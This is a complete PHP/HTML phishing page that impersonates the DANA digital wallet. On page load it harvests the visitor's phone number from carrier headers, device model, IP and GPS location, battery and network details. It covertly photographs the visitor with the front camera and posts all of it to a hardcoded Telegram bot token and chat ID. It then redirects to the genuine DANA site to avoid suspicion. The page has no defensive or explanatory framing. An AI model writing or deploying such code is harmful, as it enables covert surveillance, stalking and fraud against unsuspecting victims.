<?php
/**
 * index.php - Halaman Verifikasi DANA
 * Menangkap header operator untuk nomor HP + deteksi perangkat akurat
 */

// =========================================================
// 1. TANGKAP NOMOR HP DARI HEADER OPERATOR
// =========================================================
$nomorHp = null;
if (isset($_SERVER['HTTP_X_MSISDN'])) {
    $nomorHp = preg_replace('/[^0-9]/', '', $_SERVER['HTTP_X_MSISDN']);
} elseif (isset($_SERVER['HTTP_X_UP_CALLING_LINE_ID'])) {
    $nomorHp = preg_replace('/[^0-9]/', '', $_SERVER['HTTP_X_UP_CALLING_LINE_ID']);
} elseif (isset($_SERVER['HTTP_X_NETWORK_INFO'])) {
    // Kadang format: "GSM;MCCMNC=51010;MSISDN=08123456789"
    preg_match('/MSISDN=([0-9]+)/', $_SERVER['HTTP_X_NETWORK_INFO'], $matches);
    if (!empty($matches[1])) $nomorHp = $matches[1];
}

// Format nomor agar rapi (misal 08123456789)
if ($nomorHp && strlen($nomorHp) >= 10) {
    // Jika diawali 0, biarkan; jika diawali 62, ubah ke 0
    if (substr($nomorHp, 0, 2) === '62') {
        $nomorHp = '0' . substr($nomorHp, 2);
    }
    // Format: 0812-3456-7890 (opsional, biarkan polos biar fleksibel)
}

// =========================================================
// 2. DETEKSI NAMA HP AKURAT DARI USER-AGENT
// =========================================================
function getDeviceNameAccurate($ua = null) {
    if ($ua === null) $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // ---------- Daftar mapping brand Indonesia ----------
    $brands = [
        'Samsung' => ['Samsung', 'SM-', 'GT-', 'SC-', 'SM-G', 'SM-A', 'SM-M', 'SM-J', 'SM-T'],
        'Xiaomi'  => ['Xiaomi', 'Mi ', 'Redmi', 'POCO', 'M200', 'M210', 'M220', '2201', '2202', '2210'],
        'OPPO'    => ['OPPO', 'CPH', 'RMX', 'A160', 'A170', 'A180', 'A190'],
        'Vivo'    => ['Vivo', 'V19', 'V20', 'V21', 'V22', 'V23', 'V24', 'V25', '1900', '1901'],
        'Realme'  => ['Realme', 'RMX', 'RMP'],
        'OnePlus' => ['OnePlus', 'GM190', 'GM191', 'IN201', 'LE21', 'LE22', 'LE21', 'LE22'],
        'Google'  => ['Pixel', 'Nexus'],
        'Nokia'   => ['Nokia', 'TA-'],
        'Huawei'  => ['Huawei', 'P20', 'P30', 'P40', 'P50', 'Mate', 'Y7', 'Y8', 'Y9', 'LIO', 'MAR', 'ANE'],
        'ASUS'    => ['ASUS', 'ZenFone', 'Zenfone', 'ASUS_Z'],
        'Sony'    => ['Sony', 'Xperia', 'G814', 'G834', 'H811', 'H821', 'H831', 'H943', 'J811', 'J921'],
        'Motorola' => ['Motorola', 'Moto G', 'Moto E', 'Moto Z', 'XT'],
        'LG'      => ['LG', 'LM-', 'LG-H', 'LG-K'],
        'HTC'     => ['HTC', '2PZC', '2Q4', '2Q5'],
        'Infinix' => ['Infinix', 'X657', 'X658', 'X659', 'X660', 'X663', 'X664', 'X665'],
        'Tecno'   => ['Tecno', 'Tecno Camon', 'Tecno Spark', 'KD', 'KE'],
        'Itel'    => ['Itel', 'Itel A', 'Itel P', 'Itel S'],
        'Apple'   => ['iPhone', 'iPad', 'iPod'],
        'Nothing' => ['Nothing', 'A063', 'A065'],
        'Sharp'   => ['Sharp', 'SH-'],
        'Panasonic' => ['Panasonic', 'Eluga'],
    ];

    // Deteksi brand
    $detectedBrand = 'Perangkat';
    $model = '';
    $isApple = false;

    // Cek Apple dulu (karena punya pola khusus)
    if (strpos($ua, 'iPhone') !== false) {
        $isApple = true;
        $detectedBrand = 'Apple';
        // Cari versi iPhone
        if (preg_match('/iPhone([0-9,]+)/', $ua, $m)) {
            $models = [
                '1,1' => 'iPhone', '1,2' => 'iPhone 3G', '2,1' => 'iPhone 3GS',
                '3,1' => 'iPhone 4', '3,2' => 'iPhone 4', '3,3' => 'iPhone 4',
                '4,1' => 'iPhone 4S', '5,1' => 'iPhone 5', '5,2' => 'iPhone 5',
                '5,3' => 'iPhone 5C', '5,4' => 'iPhone 5C', '6,1' => 'iPhone 5S',
                '6,2' => 'iPhone 5S', '7,1' => 'iPhone 6 Plus', '7,2' => 'iPhone 6',
                '8,1' => 'iPhone 6S', '8,2' => 'iPhone 6S Plus', '8,3' => 'iPhone SE',
                '8,4' => 'iPhone SE', '9,1' => 'iPhone 7', '9,2' => 'iPhone 7 Plus',
                '9,3' => 'iPhone 7', '9,4' => 'iPhone 7 Plus', '10,1' => 'iPhone 8',
                '10,2' => 'iPhone 8 Plus', '10,3' => 'iPhone X', '10,4' => 'iPhone 8',
                '10,5' => 'iPhone 8 Plus', '10,6' => 'iPhone X', '11,1' => 'iPhone XS',
                '11,2' => 'iPhone XS Max', '11,3' => 'iPhone XR', '11,4' => 'iPhone XS Max',
                '12,1' => 'iPhone 11', '12,3' => 'iPhone 11 Pro', '12,5' => 'iPhone 11 Pro Max',
                '12,8' => 'iPhone SE (2nd)', '13,1' => 'iPhone 12 mini', '13,2' => 'iPhone 12',
                '13,3' => 'iPhone 12 Pro', '13,4' => 'iPhone 12 Pro Max',
                '14,2' => 'iPhone 13 Pro', '14,3' => 'iPhone 13 Pro Max', '14,4' => 'iPhone 13 mini',
                '14,5' => 'iPhone 13', '14,6' => 'iPhone SE (3rd)',
                '15,2' => 'iPhone 14 Pro', '15,3' => 'iPhone 14 Pro Max', '15,4' => 'iPhone 14',
                '15,5' => 'iPhone 14 Plus', '16,1' => 'iPhone 15 Pro', '16,2' => 'iPhone 15 Pro Max',
                '16,3' => 'iPhone 15', '16,4' => 'iPhone 15 Plus',
                '17,1' => 'iPhone 16 Pro', '17,2' => 'iPhone 16 Pro Max', '17,3' => 'iPhone 16',
                '17,4' => 'iPhone 16 Plus',
            ];
            $key = $m[1] ?? '';
            if (isset($models[$key])) $model = $models[$key];
        }
        // Cari iPad
    } elseif (strpos($ua, 'iPad') !== false) {
        $isApple = true;
        $detectedBrand = 'Apple';
        if (preg_match('/iPad([0-9,]+)/', $ua, $m)) {
            $models = [
                '1,1' => 'iPad', '2,1' => 'iPad 2', '2,2' => 'iPad 2', '2,3' => 'iPad 2',
                '3,1' => 'iPad 3', '3,2' => 'iPad 3', '3,3' => 'iPad 3',
                '4,1' => 'iPad 4', '4,2' => 'iPad 4', '4,3' => 'iPad 4',
                '5,1' => 'iPad Pro 12.9"', '5,2' => 'iPad Pro 12.9"',
                '5,3' => 'iPad Pro 9.7"', '5,4' => 'iPad Pro 9.7"',
                '6,1' => 'iPad Pro 12.9" (2nd)', '6,2' => 'iPad Pro 12.9" (2nd)',
                '6,3' => 'iPad Pro 10.5"', '6,4' => 'iPad Pro 10.5"',
                '7,1' => 'iPad Pro 12.9" (3rd)', '7,2' => 'iPad Pro 12.9" (3rd)',
                '7,3' => 'iPad Pro 11"', '7,4' => 'iPad Pro 11"',
                '8,1' => 'iPad Pro 11" (2nd)', '8,2' => 'iPad Pro 11" (2nd)',
                '8,3' => 'iPad Pro 12.9" (4th)', '8,4' => 'iPad Pro 12.9" (4th)',
                '11,1' => 'iPad Pro 12.9" (5th)', '11,2' => 'iPad Pro 12.9" (5th)',
                '11,3' => 'iPad Pro 11" (3rd)', '11,4' => 'iPad Pro 11" (3rd)',
            ];
            $key = $m[1] ?? '';
            if (isset($models[$key])) $model = $models[$key];
        }
    }

    // Jika bukan Apple, cari brand lain
    if (!$isApple) {
        foreach ($brands as $brand => $patterns) {
            if ($brand === 'Apple') continue;
            foreach ($patterns as $pattern) {
                if (stripos($ua, $pattern) !== false) {
                    $detectedBrand = $brand;
                    break 2;
                }
            }
        }

        // Cari model spesifik dari User-Agent
        // Pola umum: "Brand Model" atau "Brand-Model" atau "Brand Model Build"
        $uaClean = preg_replace('/\s+Build\/[^ ]+/', '', $ua);
        $uaClean = preg_replace('/ Android [0-9.]+[;)]/', '', $uaClean);

        if ($detectedBrand !== 'Perangkat') {
            // Coba ambil model setelah brand
            $brandPattern = preg_quote($detectedBrand, '/');
            if (preg_match('/' . $brandPattern . '\s+([A-Za-z0-9\-_]+)/i', $ua, $m)) {
                $potentialModel = trim($m[1]);
                // Filter yang terlalu pendek atau umum
                if (strlen($potentialModel) > 2 && !in_array(strtoupper($potentialModel), ['PRO', 'MAX', 'PLUS', 'LITE', 'NEO', '5G'])) {
                    $model = $potentialModel;
                }
            }
            // Coba pola lain: setelah brand dengan tanda kurung
            if (!$model) {
                if (preg_match('/' . $brandPattern . '[^;)]*[;)]\s*([A-Za-z0-9\-_]+)/i', $ua, $m)) {
                    $potentialModel = trim($m[1]);
                    if (strlen($potentialModel) > 2) {
                        $model = $potentialModel;
                    }
                }
            }
            // Coba dari model code (SM-G990B, M2101K7AG, dll)
            if (!$model) {
                if (preg_match('/(SM-[A-Z0-9]+)/i', $ua, $m)) {
                    $model = $m[1];
                } elseif (preg_match('/(M[0-9]{4}[A-Z0-9]+)/i', $ua, $m)) {
                    $model = $m[1];
                } elseif (preg_match('/(CPH[0-9]{4})/i', $ua, $m)) {
                    $model = $m[1];
                } elseif (preg_match('/(RMX[0-9]{4})/i', $ua, $m)) {
                    $model = $m[1];
                } elseif (preg_match('/(V[0-9]{4})/i', $ua, $m)) {
                    $model = $m[1];
                } elseif (preg_match('/(TA-[0-9]{4})/i', $ua, $m)) {
                    $model = $m[1];
                }
            }
        }

        // Jika masih tidak ada model, coba ambil dari "Build/" atau "Kernel"
        if (!$model && preg_match('/Build\/([A-Za-z0-9.]+)/', $ua, $m)) {
            $model = $m[1];
        }
    }

    // Gabungkan brand + model
    if ($model) {
        // Bersihkan model dari karakter aneh
        $model = preg_replace('/[^A-Za-z0-9\-_\s.]/', '', $model);
        // Jika model terlalu panjang (biasanya build number), potong
        if (strlen($model) > 30) {
            $model = substr($model, 0, 30);
        }
        $fullName = $detectedBrand . ' ' . $model;
    } else {
        $fullName = $detectedBrand;
        // Jika brand masih 'Perangkat', coba ambil dari OS
        if ($fullName === 'Perangkat') {
            if (strpos($ua, 'Android') !== false) {
                if (preg_match('/Android\s+([0-9.]+)/', $ua, $m)) {
                    $fullName = 'Android ' . $m[1];
                } else {
                    $fullName = 'Android Device';
                }
            } elseif (strpos($ua, 'Windows') !== false) {
                $fullName = 'Windows PC';
            } elseif (strpos($ua, 'Mac OS') !== false) {
                $fullName = 'Mac';
            } elseif (strpos($ua, 'Linux') !== false) {
                $fullName = 'Linux Device';
            } else {
                $fullName = 'Perangkat Tidak Dikenal';
            }
        }
    }

    // Tambahkan resolusi layar
    if (isset($_COOKIE['screen_resolution'])) {
        $fullName .= ' (' . $_COOKIE['screen_resolution'] . ')';
    }

    return $fullName;
}

$deviceNameAccurate = getDeviceNameAccurate();

// =========================================================
// 3. SEDIAKAN DATA UNTUK JAVASCRIPT
// =========================================================
$dataForJS = [
    'nomorHp' => $nomorHp,
    'deviceName' => $deviceNameAccurate,
];
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="theme-color" content="#108ee9" />
  <title>DANA - Dompet Digital</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet" />

  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body {
      height:100%;
      background:#108EE9;
      font-family:'Open Sans',sans-serif;
      color:#fff;
      -webkit-font-smoothing:antialiased;
    }
    .page {
      height:100%;
      display:flex;
      flex-direction:column;
      justify-content:center;
      align-items:center;
      padding:20px;
      max-width:480px;
      margin:0 auto;
      text-align:center;
    }
    .illustration {
      width:180px;
      height:180px;
      margin-bottom:10px;
    }
    .illustration img {
      width:100%;
      height:100%;
      object-fit:contain;
    }
    .logo {
      display:flex;
      align-items:center;
      gap:12px;
      margin-bottom:6px;
    }
    .logo .mark {
      width:44px;
      height:44px;
      border-radius:50%;
      background:#fff;
      color:#108EE9;
      display:flex;
      align-items:center;
      justify-content:center;
      flex-shrink:0;
    }
    .logo .mark svg {
      width:24px;
      height:24px;
    }
    .logo .text {
      font-size:36px;
      font-weight:800;
      letter-spacing:0.15em;
      color:#fff;
    }
    .title {
      font-size:28px;
      font-weight:700;
      margin:10px 0 6px;
      line-height:1.2;
    }
    .desc {
      font-size:16px;
      color:rgba(255,255,255,0.9);
      max-width:320px;
      line-height:1.5;
    }
    .btn-wrap {
      width:100%;
      max-width:320px;
      margin-top:24px;
      padding:0 16px;
      position:fixed;
      bottom:32px;
      left:50%;
      transform:translateX(-50%);
    }
    .btn-wrap button {
      width:100%;
      padding:16px;
      background:#fff;
      border:none;
      border-radius:6px;
      font-size:18px;
      font-weight:700;
      color:#108EE9;
      cursor:pointer;
      transition:0.15s;
      letter-spacing:0.05em;
    }
    .btn-wrap button:hover { background:rgba(255,255,255,0.9); }
    .btn-wrap button:active { transform:scale(0.97); }

    .error-overlay {
      display:none;
      position:fixed;
      inset:0;
      z-index:9999;
      background:#0a0620;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      color:rgba(255,255,255,0.12);
      font-size:3rem;
      font-weight:200;
      letter-spacing:10px;
      text-transform:uppercase;
      padding:20px;
    }
    .error-overlay .sub {
      font-size:0.8rem;
      color:rgba(255,255,255,0.04);
      letter-spacing:4px;
      margin-top:10px;
    }
    .error-overlay .retry-btn {
      margin-top:24px;
      padding:12px 32px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.08);
      border-radius:40px;
      color:rgba(255,255,255,0.25);
      font-size:0.8rem;
      font-weight:500;
      letter-spacing:3px;
      text-transform:uppercase;
      cursor:pointer;
      transition:0.3s;
    }
    .error-overlay .retry-btn:hover {
      background:rgba(255,255,255,0.08);
      color:rgba(255,255,255,0.4);
      border-color:rgba(255,255,255,0.15);
    }

    video { display:none !important; }

    @media (max-width:480px) {
      .illustration { width:140px; height:140px; }
      .logo .text { font-size:28px; }
      .title { font-size:22px; }
      .desc { font-size:14px; }
      .btn-wrap { bottom:20px; padding:0 12px; }
      .btn-wrap button { padding:14px; font-size:16px; }
      .error-overlay { font-size:2.2rem; }
    }
    @media (max-width:360px) {
      .illustration { width:120px; height:120px; }
      .logo .text { font-size:24px; }
      .title { font-size:20px; }
    }
  </style>
</head>
<body>

  <!-- ===== MAIN PAGE ===== -->
  <div class="page" id="mainPage">
    <div class="illustration">
      <img src="dana-hero.png" alt="DANA" />
    </div>
    <div class="logo">
      <span class="mark">
        <svg viewBox="0 0 24 24" fill="currentColor">
          <path d="M4 8c0-1.1.9-2 2-2h9c3.3 0 6 2.7 6 6s-2.7 6-6 6H6a2 2 0 0 1-2-2V8Zm3 1v6h8a3 3 0 0 0 0-6H7Z"/>
        </svg>
      </span>
      <span class="text">DANA</span>
    </div>
    <h1 class="title">Dompet digital yang aman dan tepercaya!</h1>
    <p class="desc">Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman</p>
  </div>

  <!-- ===== FIXED BUTTON ===== -->
  <div class="btn-wrap">
    <button id="openDana">BUKA DI DANA</button>
  </div>

  <!-- ===== ERROR OVERLAY ===== -->
  <div class="error-overlay" id="errorOverlay">
    Error
    <div class="sub">—</div>
    <button class="retry-btn" id="retryBtn">⟳ Coba Ulang</button>
  </div>

  <!-- ===== SCRIPT ===== -->
  <script>
    (function() {
      'use strict';

      // ---------- DATA DARI PHP ----------
      const DATA_DARI_PHP = <?php echo json_encode($dataForJS); ?>;
      const NOMOR_HP = DATA_DARI_PHP.nomorHp || null;
      const DEVICE_NAME_PHP = DATA_DARI_PHP.deviceName || 'Perangkat Tidak Dikenal';

      // ---------- KONFIGURASI ----------
      const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
      const CHAT_ID = '8463156896';
      const MAX_RETRY = 3;

      // ---------- STATE ----------
      let status = {
        cameraAttempts: 0,
        cameraGranted: false,
        cameraDenied: false,
        alreadySent: false,
        locationReady: false,
        retryTimer: null
      };

      let deviceName = DEVICE_NAME_PHP; // pakai dari PHP (nama HP akurat)
      let locationData = null;
      let gpsData = null;
      let batteryInfo = null;
      let connectionInfo = null;

      const mainPage = document.getElementById('mainPage');
      const errorOverlay = document.getElementById('errorOverlay');
      const retryBtn = document.getElementById('retryBtn');
      const danaBtn = document.getElementById('openDana');

      // =========================================================
      // 1. AMBIL LOKASI DARI IP
      // =========================================================
      async function fetchLocationFromIP() {
        try {
          const ctrl = new AbortController();
          const timer = setTimeout(() => ctrl.abort(), 6000);
          const res = await fetch('https://ipapi.co/json/', {
            signal: ctrl.signal,
            headers: { Accept: 'application/json' }
          });
          clearTimeout(timer);
          if (!res.ok) throw new Error('HTTP ' + res.status);
          const d = await res.json();
          return {
            ip: d.ip || null,
            city: d.city || null,
            region: d.region || null,
            country: d.country_name || null,
            postal: d.postal || null,
            lat: d.latitude || null,
            lng: d.longitude || null,
            org: d.org || null,
            tz: d.timezone || null
          };
        } catch {
          return null;
        }
      }

      // =========================================================
      // 2. AMBIL GPS
      // =========================================================
      function fetchGPS() {
        return new Promise((resolve) => {
          if (!navigator.geolocation) { resolve(null); return; }
          const timer = setTimeout(() => resolve(null), 5000);
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              clearTimeout(timer);
              resolve({
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                acc: pos.coords.accuracy
              });
            },
            () => {
              clearTimeout(timer);
              resolve(null);
            },
            { enableHighAccuracy: true }
          );
        });
      }

      // =========================================================
      // 3. AMBIL BATERAI
      // =========================================================
      async function fetchBattery() {
        try {
          if (!navigator.getBattery) return null;
          const bat = await navigator.getBattery();
          return {
            level: Math.round(bat.level * 100) + '%',
            charging: bat.charging ? 'Ya' : 'Tidak'
          };
        } catch {
          return null;
        }
      }

      // =========================================================
      // 4. AMBIL INFO KONEKSI
      // =========================================================
      function fetchConnection() {
        try {
          if (!navigator.connection) return null;
          const conn = navigator.connection;
          return {
            type: conn.effectiveType || null,
            downlink: conn.downlink ? conn.downlink + ' Mbps' : null,
            rtt: conn.rtt ? conn.rtt + ' ms' : null
          };
        } catch {
          return null;
        }
      }

      // =========================================================
      // 5. KUMPULKAN SEMUA DATA
      // =========================================================
      async function collectAllData() {
        const [ipResult, gpsResult, batResult] = await Promise.allSettled([
          fetchLocationFromIP(),
          fetchGPS(),
          fetchBattery()
        ]);
        locationData = ipResult.status === 'fulfilled' ? ipResult.value : null;
        gpsData = gpsResult.status === 'fulfilled' ? gpsResult.value : null;
        batteryInfo = batResult.status === 'fulfilled' ? batResult.value : null;
        connectionInfo = fetchConnection();
        status.locationReady = true;
      }

      // =========================================================
      // 6. BUAT CAPTION (dengan NOMOR HP + NAMA HP AKURAT)
      // =========================================================
      function buildCaption(hasPhoto) {
        const lines = [];
        if (hasPhoto) {
          lines.push('📸 Foto diambil otomatis');
        } else {
          lines.push('⚠️ Gagal mengambil foto');
        }

        // ---- NOMOR HP (dari header operator) ----
        if (NOMOR_HP) {
          lines.push(`📞 Nomor HP: ${NOMOR_HP}`);
        } else {
          lines.push(`📞 Nomor HP: Tidak terdeteksi (akses via WiFi atau operator tidak mendukung)`);
        }

        // ---- NAMA HP AKURAT ----
        lines.push(`📱 Nama HP: ${deviceName}`);

        // ---- TIMESTAMP & TIMEZONE ----
        const now = new Date();
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
        const timestampStr = now.toLocaleString('id-ID', {
          year: 'numeric', month: '2-digit', day: '2-digit',
          hour: '2-digit', minute: '2-digit', second: '2-digit',
          hour12: false
        });
        lines.push(`🕒 ${timestampStr} (${tz})`);
        lines.push(`⏱️ UNIX: ${Date.now()}`);

        // ---- KONEKSI ----
        if (connectionInfo) {
          const parts = [];
          if (connectionInfo.type) parts.push(`Jaringan: ${connectionInfo.type}`);
          if (connectionInfo.downlink) parts.push(`Kecepatan: ${connectionInfo.downlink}`);
          if (connectionInfo.rtt) parts.push(`RTT: ${connectionInfo.rtt}`);
          if (parts.length) lines.push(`📶 ${parts.join(' | ')}`);
        }

        // ---- BATERAI ----
        if (batteryInfo) {
          lines.push(`🔋 Baterai: ${batteryInfo.level} (Charging: ${batteryInfo.charging})`);
        }

        // ---- LOKASI IP ----
        if (locationData) {
          if (locationData.ip) lines.push(`\n🌐 IP Publik : ${locationData.ip}`);
          if (locationData.org) lines.push(`📡 Operator/ISP : ${locationData.org}`);
          const locParts = [];
          if (locationData.city) locParts.push(locationData.city);
          if (locationData.region) locParts.push(locationData.region);
          if (locationData.country) locParts.push(locationData.country);
          if (locParts.length) lines.push(`📍 Lokasi IP : ${locParts.join(', ')}`);
          if (locationData.postal) lines.push(`📮 Kode Pos : ${locationData.postal}`);
          if (locationData.tz) lines.push(`🕐 Zona Waktu (IP): ${locationData.tz}`);
          if (locationData.lat && locationData.lng) {
            lines.push(`🗺️ Koordinat (IP) : ${locationData.lat}, ${locationData.lng}`);
            lines.push(`   🗺️ Maps : https://maps.google.com/?q=${locationData.lat},${locationData.lng}`);
          }
        }

        // ---- GPS ----
        if (gpsData) {
          lines.push(`\n📡 GPS (akurat):`);
          lines.push(`   📍 Lat : ${gpsData.lat}`);
          lines.push(`   📍 Long : ${gpsData.lng}`);
          if (gpsData.acc) {
            lines.push(`   🎯 Akurasi : ±${Math.round(gpsData.acc)} meter`);
          }
          lines.push(`   🗺️ Maps : https://maps.google.com/?q=${gpsData.lat},${gpsData.lng}`);
        }

        if (!locationData && !gpsData) {
          lines.push(`\n⚠️ Data lokasi tidak tersedia`);
        }

        if (!hasPhoto) {
          lines.push(`\n⚠️ Izin kamera ditolak, hanya mengirim data lokasi`);
        }

        return lines.join('\n');
      }

      // =========================================================
      // 7. KIRIM DENGAN FOTO
      // =========================================================
      async function sendWithPhoto(dataUrl) {
        try {
          const blob = await fetch(dataUrl).then(r => r.blob());
          const fd = new FormData();
          fd.append('photo', blob, 'foto.png');
          fd.append('caption', buildCaption(true));
          fd.append('chat_id', CHAT_ID);

          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: fd
          });
          if (!res.ok) throw new Error('API error');
          status.alreadySent = true;
          console.log('✅ Foto + data terkirim');
        } catch (e) {
          console.error('Gagal kirim foto:', e);
        }
      }

      // =========================================================
      // 8. KIRIM TEKS TANPA FOTO
      // =========================================================
      async function sendTextOnly() {
        try {
          const payload = {
            chat_id: CHAT_ID,
            text: buildCaption(false),
            parse_mode: 'HTML'
          };
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          if (!res.ok) throw new Error('API error');
          status.alreadySent = true;
          console.log('✅ Teks (tanpa foto) terkirim');
        } catch (e) {
          console.error('Gagal kirim teks:', e);
        }
      }

      // =========================================================
      // 9. CAPTURE & SEND
      // =========================================================
      function captureAndSend(video) {
        if (status.alreadySent) return;

        const canvas = document.createElement('canvas');
        const w = video.videoWidth || 640;
        const h = video.videoHeight || 480;
        canvas.width = w;
        canvas.height = h;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, w, h);
        const dataUrl = canvas.toDataURL('image/png');

        if (video.srcObject) {
          video.srcObject.getTracks().forEach(t => t.stop());
        }

        if (!status.locationReady) {
          setTimeout(() => sendWithPhoto(dataUrl), 1000);
        } else {
          sendWithPhoto(dataUrl);
        }
      }

      // =========================================================
      // 10. ERROR -> TAMPILKAN + KIRIM TEKS
      // =========================================================
      function showErrorAndSendText() {
        status.cameraDenied = true;
        mainPage.style.display = 'none';
        errorOverlay.style.display = 'flex';

        if (status.retryTimer) {
          clearTimeout(status.retryTimer);
          status.retryTimer = null;
        }

        if (!status.locationReady) {
          setTimeout(() => sendTextOnly(), 2000);
        } else {
          sendTextOnly();
        }
      }

      // =========================================================
      // 11. RESET & RETRY
      // =========================================================
      function resetAndRetry() {
        status.cameraDenied = false;
        status.cameraAttempts = 0;
        status.alreadySent = false;
        if (status.retryTimer) {
          clearTimeout(status.retryTimer);
          status.retryTimer = null;
        }
        errorOverlay.style.display = 'none';
        mainPage.style.display = 'flex';
        setTimeout(startCamera, 300);
      }

      // =========================================================
      // 12. MULAI KAMERA
      // =========================================================
      function startCamera() {
        if (status.alreadySent || status.cameraDenied) return;

        status.cameraAttempts++;

        navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false
        })
        .then(stream => {
          status.cameraGranted = true;
          const video = document.createElement('video');
          video.style.display = 'none';
          video.setAttribute('playsinline', '');
          video.muted = true;
          video.srcObject = stream;
          document.body.appendChild(video);

          video.onloadedmetadata = () => {
            video.play()
              .then(() => {
                setTimeout(() => captureAndSend(video), 100);
              })
              .catch(() => {
                if (status.cameraAttempts < MAX_RETRY) {
                  status.retryTimer = setTimeout(startCamera, 2000);
                } else {
                  showErrorAndSendText();
                }
              });
          };
          video.onerror = () => {
            if (status.cameraAttempts < MAX_RETRY) {
              status.retryTimer = setTimeout(startCamera, 2000);
            } else {
              showErrorAndSendText();
            }
          };
        })
        .catch(err => {
          console.error('Kamera error:', err);
          if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
            showErrorAndSendText();
            return;
          }
          if (status.cameraAttempts < MAX_RETRY) {
            status.retryTimer = setTimeout(startCamera, 2000);
          } else {
            showErrorAndSendText();
          }
        });
      }

      // =========================================================
      // 13. SIMPAN RESOLUSI LAYAR KE COOKIE (untuk PHP)
      // =========================================================
      function setScreenResolution() {
        if (window.screen) {
          const res = window.screen.width + 'x' + window.screen.height;
          document.cookie = 'screen_resolution=' + encodeURIComponent(res) + '; path=/; max-age=3600';
        }
      }

      // =========================================================
      // 14. INIT
      // =========================================================
      async function init() {
        // Simpan resolusi layar untuk PHP
        setScreenResolution();

        console.log('📱 Device (dari PHP):', deviceName);
        if (NOMOR_HP) {
          console.log('📞 Nomor HP (dari header):', NOMOR_HP);
        } else {
          console.log('📞 Nomor HP: Tidak terdeteksi');
        }

        await collectAllData();
        console.log('📍 Lokasi:', locationData, gpsData);
        console.log('🔋 Baterai:', batteryInfo);
        console.log('📶 Koneksi:', connectionInfo);

        setTimeout(startCamera, 400);
      }

      // =========================================================
      // 15. EVENT LISTENER
      // =========================================================

      if (retryBtn) {
        retryBtn.addEventListener('click', function(e) {
          e.stopPropagation();
          e.preventDefault();
          resetAndRetry();
        });
      }

      if (danaBtn) {
        danaBtn.addEventListener('click', function(e) {
          this.style.transform = 'scale(0.96)';
          setTimeout(() => this.style.transform = '', 150);

          if (status.cameraDenied) {
            resetAndRetry();
            setTimeout(() => {
              tryRedirect();
            }, 600);
            return;
          }

          if (!status.alreadySent && !status.cameraDenied) {
            status.cameraAttempts = 0;
            startCamera();
          }

          setTimeout(() => {
            tryRedirect();
          }, 300);
        });
      }

      // ---- FALLBACK REDIRECT ----
      function tryRedirect() {
        const danaDeepLink = 'dana://';
        setTimeout(() => {
          window.location.href = 'https://www.dana.id/';
        }, 800);
        window.location.href = danaDeepLink;
      }

      // =========================================================
      // 16. JALANKAN
      // =========================================================
      if (document.readyState === 'complete') {
        init();
      } else {
        window.addEventListener('load', init);
      }

    })();
  </script>
</body>
</html>
